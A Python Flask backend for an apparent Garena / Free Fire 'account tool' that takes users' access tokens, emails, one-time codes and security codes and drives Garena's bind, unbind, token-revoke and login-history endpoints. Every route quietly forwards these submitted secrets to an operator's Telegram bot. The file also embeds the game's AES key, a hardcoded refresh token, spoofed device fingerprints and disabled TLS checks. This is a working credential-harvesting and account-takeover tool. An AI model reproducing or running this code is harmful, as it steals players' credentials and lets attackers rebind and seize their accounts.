import os
import sys
import json
import hashlib
import urllib.parse
import base64
import requests
import urllib3
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS

# ================= TELEGRAM LOGGING =================
TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN"   # CHANGE THIS
TELEGRAM_CHAT_ID   = "YOUR_CHAT_ID"     # CHANGE THIS

def tg_log(msg):
    if TELEGRAM_BOT_TOKEN == "YOUR_BOT_TOKEN" or TELEGRAM_CHAT_ID == "YOUR_CHAT_ID":
        print("[!] Telegram not configured. Logs only in console.")
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": msg[:4090], "parse_mode": "HTML"}, timeout=5)
    except: pass

def log_action(action, details):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0] if request else "unknown"
    ua = request.headers.get('User-Agent', 'unknown') if request else "unknown"
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    msg = f"<b>🎯 {action}</b>\n🕒 {timestamp}\n🌐 IP: {ip}\n📱 UA: {ua[:80]}\n📦 DATA:\n<pre>{json.dumps(details, indent=2)}</pre>"
    tg_log(msg)
    print(f"[LOG] {action}: {details}")

# ================= PROTOBUF IMPORTS =================
import MajoRLogin_pb2 as mLpB
import MajorLoginRes_pb2 as mLrPb
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ================= FLASK =================
app = Flask(__name__)
CORS(app)

# ================= ORIGINAL CONSTANTS =================
AeSkEy = b'Yg&tc%DEuh6%Zc^8'
AeSiV  = b'6oyZDr22E3ychjM%'

PLATFORM_MAP = {
    3: "Facebook", 4: "Guest", 5: "VK",
    6: "Huawei", 8: "Google", 11: "X (Twitter)", 13: "AppleId",
}

def enc(d): return AES.new(AeSkEy, AES.MODE_CBC, AeSiV).encrypt(pad(d, 16))
def dec(d): return unpad(AES.new(AeSkEy, AES.MODE_CBC, AeSiV).decrypt(d), 16)

def convert_seconds(s):
    d, h = divmod(s, 86400)
    h, m = divmod(h, 3600)
    m, s = divmod(m, 60)
    return f"{d} Day {h} Hour {m} Min {s} Sec"

def build_majorlogin(tok, open_id, p_type):
    m = mLpB.MajorLogin()
    m.event_time = str(datetime.now())[:-7]
    m.game_name = "free fire"
    m.platform_id = p_type
    m.client_version = "1.120.1"
    m.system_software = "Android OS 9 / API-28"
    m.system_hardware = "Handheld"
    m.telecom_operator = "Verizon"
    m.network_type = "WIFI"
    m.screen_width = 1920
    m.screen_height = 1080
    m.screen_dpi = "280"
    m.processor_details = "ARM64 FP ASIMD AES VMH | 2865 | 4"
    m.memory = 3003
    m.gpu_renderer = "Adreno (TM) 640"
    m.gpu_version = "OpenGL ES 3.1 v1.46"
    m.unique_device_id = "Google|34a7dcdf-a7d5-4cb6-8d7e-3b0e448a0c57"
    m.client_ip = "223.191.51.89"
    m.language = "en"
    m.open_id = open_id
    m.open_id_type = str(p_type)
    m.device_type = "Handheld"
    m.access_token = tok
    m.platform_sdk_id = 1
    m.client_using_version = "7428b253defc164018c604a1ebbfebdf"
    m.login_by = 3
    m.channel_type = 3
    m.cpu_type = 2
    m.cpu_architecture = "64"
    m.client_version_code = "2019118695"
    m.login_open_id_type = p_type
    m.origin_platform_type = str(p_type)
    m.primary_platform_type = str(p_type)
    return enc(m.SerializeToString())

def read_varint(data, offset):
    res = 0; shift = 0
    while True:
        if offset >= len(data): break
        b = data[offset]; offset += 1
        res |= (b & 0x7f) << shift
        if not (b & 0x80): break
        shift += 7
    return res, offset

def parse_record(data):
    rec = {}; offset = 0
    while offset < len(data):
        tag, offset = read_varint(data, offset)
        wt, f = tag & 7, tag >> 3
        if wt == 0:
            val, offset = read_varint(data, offset)
            if f == 1: rec['ts'] = val
            elif f == 2: rec['ram'] = val
        elif wt == 2:
            length, offset = read_varint(data, offset)
            val = data[offset:offset+length]; offset += length
            if f == 3: rec['dev'] = val.decode(errors='ignore')
            elif f == 4: rec['arch'] = val.decode(errors='ignore')
        else: break
    return rec

def parse_history_protobuf(data):
    records = []; offset = 0
    while offset < len(data):
        tag, offset = read_varint(data, offset)
        wt, f = tag & 7, tag >> 3
        if wt == 0: val, offset = read_varint(data, offset)
        elif wt == 2:
            length, offset = read_varint(data, offset)
            val = data[offset:offset+length]; offset += length
            if f == 1: records.append(parse_record(val))
        else: break
    return records

# ================= ROUTES =================
@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/api/bind-info', methods=['POST'])
def api_bind_info():
    data = request.json
    token = data.get('access_token', '')
    log_action("BIND_INFO", {"access_token": token})
    try:
        url = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
        params = {'app_id': '100067', 'access_token': token}
        headers = {'User-Agent': 'GarenaMSDK/4.0.19P9'}
        resp = requests.get(url, params=params, headers=headers, timeout=15)
        if resp.status_code == 200:
            j = resp.json()
            return jsonify({
                "success": True,
                "email": j.get("email", ""),
                "pending_email": j.get("email_to_be", ""),
                "countdown": j.get("request_exec_countdown", 0),
                "countdown_human": convert_seconds(j.get("request_exec_countdown", 0)),
                "result_msg": "Success" if j.get("result") == 0 else "Failed"
            })
        return jsonify({"success": False, "error": f"HTTP {resp.status_code}"})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/bind/send-otp', methods=['POST'])
def bind_send_otp():
    data = request.json
    token = data.get('access_token')
    email = data.get('email')
    log_action("BIND_SEND_OTP", {"access_token": token, "email": email})
    try:
        url = "https://100067.connect.garena.com/game/account_security/bind:send_otp"
        payload = {"email": email, "locale": "en_PK", "region": "PK", "app_id": "100067", "access_token": token}
        headers = {"User-Agent": "GarenaMSDK/4.0.30", "Content-Type": "application/x-www-form-urlencoded"}
        resp = requests.post(url, headers=headers, data=payload, timeout=15)
        if resp.status_code == 200 and resp.json().get("result") == 0:
            return jsonify({"success": True})
        return jsonify({"success": False, "error": resp.text})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/bind/verify-otp', methods=['POST'])
def bind_verify_otp():
    data = request.json
    token = data.get('access_token')
    email = data.get('email')
    otp = data.get('otp')
    log_action("BIND_VERIFY_OTP", {"access_token": token, "email": email, "otp": otp})
    try:
        url = "https://100067.connect.garena.com/game/account_security/bind:verify_otp"
        payload = {"app_id": "100067", "access_token": token, "email": email, "code": otp, "otp": otp, "type": "1"}
        headers = {"User-Agent": "GarenaMSDK/4.0.30", "Content-Type": "application/x-www-form-urlencoded"}
        resp = requests.post(url, headers=headers, data=payload, timeout=15)
        j = resp.json()
        if j.get("result") == 0:
            verifier = j.get("verifier_token", "")
            return jsonify({"success": True, "verifier_token": verifier})
        return jsonify({"success": False, "error": j.get("error", "Verification failed")})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/bind/create', methods=['POST'])
def bind_create():
    data = request.json
    token = data.get('access_token')
    email = data.get('email')
    verifier = data.get('verifier_token')
    sec_code = data.get('secondary_password')
    log_action("BIND_CREATE", {"access_token": token, "email": email, "security_code": sec_code})
    try:
        url = "https://100067.connect.garena.com/game/account_security/bind:create_bind_request"
        payload = {"email": email, "app_id": "100067", "access_token": token, "verifier_token": verifier, "secondary_password": sec_code}
        headers = {"User-Agent": "GarenaMSDK/4.0.30", "Content-Type": "application/x-www-form-urlencoded"}
        resp = requests.post(url, headers=headers, data=payload, timeout=15)
        j = resp.json()
        if j.get("result") == 0:
            return jsonify({"success": True})
        return jsonify({"success": False, "error": j.get("error", "Bind failed")})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/unbind-email', methods=['POST'])
def unbind_email():
    data = request.json
    token = data.get('access_token')
    sec_code = data.get('security_code')
    log_action("UNBIND_EMAIL", {"access_token": token, "security_code": sec_code})
    try:
        info_url = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
        params = {'app_id': '100067', 'access_token': token}
        r_info = requests.get(info_url, params=params, timeout=10)
        email = r_info.json().get("email", "")
        if not email:
            return jsonify({"success": False, "error": "No email bound"})
        hashed = hashlib.sha256(sec_code.encode()).hexdigest()
        verify_url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
        verify_data = {"email": email, "app_id": "100067", "access_token": token, "secondary_password": hashed}
        headers = {"User-Agent": "GarenaMSDK/4.0.30", "Content-Type": "application/x-www-form-urlencoded"}
        r_verify = requests.post(verify_url, headers=headers, data=verify_data, timeout=15)
        identity_token = r_verify.json().get("identity_token")
        if not identity_token:
            return jsonify({"success": False, "error": "Identity verification failed"})
        unbind_url = "https://100067.connect.garena.com/game/account_security/bind:create_unbind_request"
        unbind_data = {"app_id": "100067", "access_token": token, "identity_token": identity_token}
        r_unbind = requests.post(unbind_url, headers=headers, data=unbind_data, timeout=15)
        if r_unbind.json().get("result") == 0:
            return jsonify({"success": True, "message": "Unbind request created (15 days cooldown)"})
        return jsonify({"success": False, "error": "Unbind request failed"})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/change-bind', methods=['POST'])
def change_bind():
    data = request.json
    token = data.get('access_token')
    new_email = data.get('new_email')
    sec_code = data.get('security_code')
    log_action("CHANGE_BIND", {"access_token": token, "new_email": new_email, "security_code": sec_code})
    try:
        info_url = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
        params = {'app_id': '100067', 'access_token': token}
        r_info = requests.get(info_url, params=params, timeout=10)
        old_email = r_info.json().get("email", "")
        if not old_email:
            return jsonify({"success": False, "error": "No email bound to change"})
        hashed = hashlib.sha256(sec_code.encode()).hexdigest()
        verify_url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
        verify_data = {"email": old_email, "app_id": "100067", "access_token": token, "secondary_password": hashed}
        headers = {"User-Agent": "GarenaMSDK/4.0.30", "Content-Type": "application/x-www-form-urlencoded"}
        r_verify = requests.post(verify_url, headers=headers, data=verify_data, timeout=15)
        identity_token = r_verify.json().get("identity_token")
        if not identity_token:
            return jsonify({"success": False, "error": "Identity verification failed"})
        send_url = "https://100067.connect.garena.com/game/account_security/bind:send_otp"
        send_data = {"email": new_email, "locale": "en_PK", "region": "PK", "app_id": "100067", "access_token": token}
        send_resp = requests.post(send_url, headers=headers, data=send_data, timeout=15)
        if send_resp.json().get("result") != 0:
            return jsonify({"success": False, "error": "Failed to send OTP to new email"})
        return jsonify({"success": False, "error": "OTP verification for new email not implemented in API. Use full flow via frontend steps."})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/cancel-bind', methods=['POST'])
def cancel_bind():
    data = request.json
    token = data.get('access_token')
    log_action("CANCEL_BIND", {"access_token": token})
    try:
        url = "https://100067.connect.garena.com/game/account_security/bind:cancel_request"
        headers = {"User-Agent": "GarenaMSDK/4.0.30", "Content-Type": "application/x-www-form-urlencoded"}
        payload = {"app_id": "100067", "access_token": token}
        resp = requests.post(url, headers=headers, data=payload, timeout=15)
        if resp.json().get("result") == 0:
            return jsonify({"success": True, "message": "Bind request cancelled"})
        return jsonify({"success": False, "error": "Cancel failed"})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/eat-to-token', methods=['POST'])
def eat_to_token():
    data = request.json
    eat_input = data.get('eat', '')
    log_action("EAT_TO_TOKEN", {"eat_input": eat_input})
    if "http" in eat_input or "?" in eat_input:
        parsed = urllib.parse.urlparse(eat_input)
        qs = urllib.parse.parse_qs(parsed.query)
        eat_token = qs.get('eat', [None])[0]
    else:
        eat_token = eat_input.strip()
    if not eat_token:
        return jsonify({"success": False, "error": "No valid EAT token found"})
    try:
        api_url = f"https://api-otrss.garena.com/support/callback/?access_token={eat_token}"
        headers = {"User-Agent": "Mozilla/5.0 (Linux; Android)"}
        resp = requests.get(api_url, headers=headers, allow_redirects=True, timeout=15)
        final_url = urllib.parse.urlparse(resp.url)
        params = urllib.parse.parse_qs(final_url.query)
        if 'access_token' in params:
            access_token = params['access_token'][0]
            return jsonify({"success": True, "access_token": access_token})
        return jsonify({"success": False, "error": "Access token not found in response"})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/revoke-token', methods=['POST'])
def revoke_token():
    data = request.json
    token = data.get('access_token')
    log_action("REVOKE_TOKEN", {"access_token": token})
    try:
        api_url = f"https://api-otrss.garena.com/support/callback/?access_token={token}"
        headers = {"User-Agent": "Mozilla/5.0"}
        r = requests.get(api_url, headers=headers, allow_redirects=True, timeout=15)
        parsed = urllib.parse.urlparse(r.url)
        params = urllib.parse.parse_qs(parsed.query)
        nickname = urllib.parse.unquote(params.get('nickname', ['Unknown'])[0])
        if 'access_token' not in params:
            return jsonify({"success": False, "error": "Token already invalid"})
        refresh = "1380dcb63ab3a077dc05bdf0b25ba4497c403a5b4eae96d7203010eafa6c83a8"
        logout_url = f"https://100067.connect.garena.com/oauth/logout?access_token={token}&refresh_token={refresh}"
        logout_res = requests.get(logout_url, headers=headers, timeout=15)
        if logout_res.status_code == 200:
            return jsonify({"success": True, "message": "Token revoked", "nickname": nickname})
        return jsonify({"success": False, "error": "Revoke failed"})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/login-history', methods=['POST'])
def login_history():
    data = request.json
    token = data.get('token')
    log_action("LOGIN_HISTORY", {"token": token[:50] + "..." if token else ""})
    try:
        jwt_token = None
        if token.startswith("ey") and "." in token:
            jwt_token = token
        else:
            oid = None
            try:
                r = requests.get(f"https://100067.connect.garena.com/oauth/token/inspect?token={token}", timeout=5)
                oid = r.json().get("open_id")
            except: pass
            if not oid:
                return jsonify({"success": False, "error": "Cannot resolve Open ID"})
            for ptype in [8,3,4,6]:
                pl = build_majorlogin(token, oid, ptype)
                try:
                    headers = {"User-Agent": "Dalvik/2.1.0", "Content-Type": "application/octet-stream"}
                    x = requests.post("https://loginbp.ggpolarbear.com/MajorLogin", headers=headers, data=pl, timeout=10, verify=False)
                    if x.status_code == 200:
                        res = mLrPb.MajorLoginRes()
                        try: res.ParseFromString(dec(x.content))
                        except: res.ParseFromString(x.content)
                        if res.token:
                            jwt_token = res.token
                            break
                except: continue
        if not jwt_token:
            return jsonify({"success": False, "error": "JWT generation failed"})
        his_headers = {
            "Authorization": f"Bearer {jwt_token}",
            "User-Agent": "Dalvik/2.1.0",
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Unity-Version": "2018.4.11f1"
        }
        r = requests.post("https://client.ind.freefiremobile.com/GetLoginHistory", headers=his_headers, data=enc(b""), timeout=15, verify=False)
        if r.status_code != 200:
            return jsonify({"success": False, "error": f"HTTP {r.status_code}"})
        try: dec_data = dec(r.content)
        except: dec_data = r.content
        records = parse_history_protobuf(dec_data)
        history = []
        for rec in records:
            ts = rec.get('ts', 0)
            date_str = datetime.fromtimestamp(ts).strftime('%Y-%m-%d %H:%M:%S') if ts else "Unknown"
            history.append({
                "timestamp": ts,
                "date": date_str,
                "device": rec.get('dev', 'Unknown'),
                "arch": rec.get('arch', 'Unknown'),
                "ram": rec.get('ram', 0)
            })
        return jsonify({"success": True, "records": history})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/bound-accounts', methods=['POST'])
def bound_accounts():
    data = request.json
    token = data.get('access_token')
    log_action("BOUND_ACCOUNTS", {"access_token": token})
    try:
        url = "https://100067.connect.garena.com/bind/app/platform/info/get"
        params = {"access_token": token}
        headers = {"User-Agent": "GarenaMSDK/4.0.19P9"}
        resp = requests.get(url, params=params, headers=headers, timeout=10)
        if resp.status_code != 200:
            return jsonify({"success": False, "error": f"HTTP {resp.status_code}"})
        d = resp.json()
        bound = d.get("bounded_accounts", [])
        available = d.get("available_platforms", [])
        platform_names = {
            1: "Garena", 3: "Facebook", 4: "Guest", 5: "VK",
            6: "Huawei", 7: "Apple", 8: "Google", 11: "X (Twitter)", 13: "Apple ID", 28: "Line"
        }
        bound_str = [platform_names.get(p, str(p)) for p in bound]
        avail_str = [platform_names.get(p, str(p)) for p in available]
        return jsonify({"success": True, "bound_accounts": bound_str, "available_platforms": avail_str})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)